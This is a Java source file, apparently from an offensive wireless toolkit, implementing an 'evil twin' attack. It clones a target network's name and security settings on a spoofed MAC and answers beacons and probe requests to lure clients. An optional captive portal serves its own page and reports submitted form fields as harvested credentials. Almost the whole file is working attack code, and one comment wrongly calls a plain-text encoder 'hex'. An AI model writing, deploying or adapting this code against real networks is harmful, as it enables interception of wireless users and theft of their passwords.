package com.opx.oss.engine.attacks;

import com.opx.oss.engine.AccessPoint;
import com.opx.oss.engine.ScanBook;
import com.opx.oss.engine.chips.WifiChip;
import com.opx.oss.engine.dot11.Frame;
import com.opx.oss.engine.dot11.Ie;
import com.opx.oss.engine.dot11.Mac;
import com.opx.oss.engine.portal.PortalServer;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

/**
 * A twin of the target's network: the same name and security on a radio we control, so a client
 * that comes looking associates with us. With the portal on, every HTTP request is answered by
 * our own page and the fields a client submits are reported back.
 */
public final class EvilTwin extends Campaign {

    private final ScanBook book;
    private final boolean portal;
    private final int portalPort;
    private final long beaconGap;
    private final Set<String> probing = new LinkedHashSet<>();
    private volatile PortalServer server;
    private volatile Events sink;

    public EvilTwin(WifiChip chip, String bssid, JSONObject options, ScanBook book,
                    boolean portal) {
        super(chip, bssid, options);
        this.book = book;
        this.portal = portal;
        this.portalPort = options.optInt("portal_port", 8080);
        this.beaconGap = Math.max(20, options.optLong("beacon_gap", 100));
    }

    @Override
    public String kind() {
        return portal ? "captive" : "eviltwin";
    }

    /** A station asked for this network by name; answer it once. */
    public void offerProbe(byte[] station) {
        String text = Mac.text(station);
        synchronized (probing) {
            if (probing.size() < 64) probing.add(text);
        }
    }

    public int portalPort() {
        PortalServer running = server;
        return running == null ? portalPort : running.port();
    }

    @Override
    protected void run(Events events) throws Exception {
        sink = events;
        AccessPoint target = book.get(bssid);
        String ssid = target == null || target.ssid.isEmpty() ? options.optString("ssid") : target.ssid;
        if (ssid == null || ssid.isEmpty()) {
            log(events, "the network has no name to twin yet; scan it first");
            return;
        }
        int channel = target != null && target.channel > 0 ? target.channel : options.optInt("channel", 6);
        chip.setChannel(channel);

        byte[] twin = Mac.randomClient();
        twin[0] = (byte) ((twin[0] & 0xFC) | 0x02);          // locally administered, unicast
        byte[] rsn = target == null ? Ie.GENERIC_RSN : Ie.forcePskAkm(target.rsnIe, false);
        boolean privacy = rsn != null;
        if (rsn == null) rsn = Ie.GENERIC_RSN;

        String twinText = Mac.text(twin);
        log(events, "twin '" + ssid + "' on channel " + channel + " as " + twinText);

        if (portal) {
            PortalServer portalServer = new PortalServer(portalPort, ssid, new PortalServer.Listener() {
                @Override
                public void onReady(int port) {
                    log(events, "portal listening on port " + port);
                }

                @Override
                public void onSubmission(Map<String, String> fields) {
                    JSONObject found = event("portal_credentials");
                    try {
                        found.put("bssid", bssid).put("twin", twinText).put("fields", new JSONObject(fields));
                    } catch (Exception ignored) {
                        // Strings and a map of strings only.
                    }
                    events.emit(found);
                }

                @Override
                public void onClosed() {
                    log(events, "portal closed");
                }
            });
            try {
                portalServer.start();
                server = portalServer;
            } catch (Exception e) {
                log(events, "cannot open the portal on port " + portalPort + ": " + e.getMessage());
            }
        }

        int rounds = Math.max(1, options.optInt("rounds", 600));
        for (int round = 1; round <= rounds && !shouldStop(); round++) {
            chip.transmit(Frame.beacon(twin, ssid, channel, rsn, 100, privacy));
            List<String> waiting;
            synchronized (probing) {
                waiting = new ArrayList<>(probing);
                probing.clear();
            }
            for (String station : waiting) {
                chip.transmit(Frame.probeResponse(twin, Mac.of(station), ssid, channel, rsn, privacy));
            }
            if (round % 20 == 0) {
                progress(events, Math.min(99, (round * 100) / rounds), waiting.size() + " answers");
            }
            sleep(beaconGap);
        }

        PortalServer running = server;
        server = null;
        if (running != null) running.stop();
        sink = null;
        log(events, "twin stopped");
    }

    @Override
    public void stop() {
        super.stop();
        PortalServer running = server;
        server = null;
        if (running != null) running.stop();
    }

    /** Lower-case hex of a submission's fields, for the vault line. */
    public static String describe(Map<String, String> fields) {
        StringBuilder text = new StringBuilder();
        for (Map.Entry<String, String> entry : fields.entrySet()) {
            if (text.length() > 0) text.append('&');
            text.append(entry.getKey()).append('=').append(entry.getValue());
        }
        return text.toString().toLowerCase(Locale.US);
    }
}
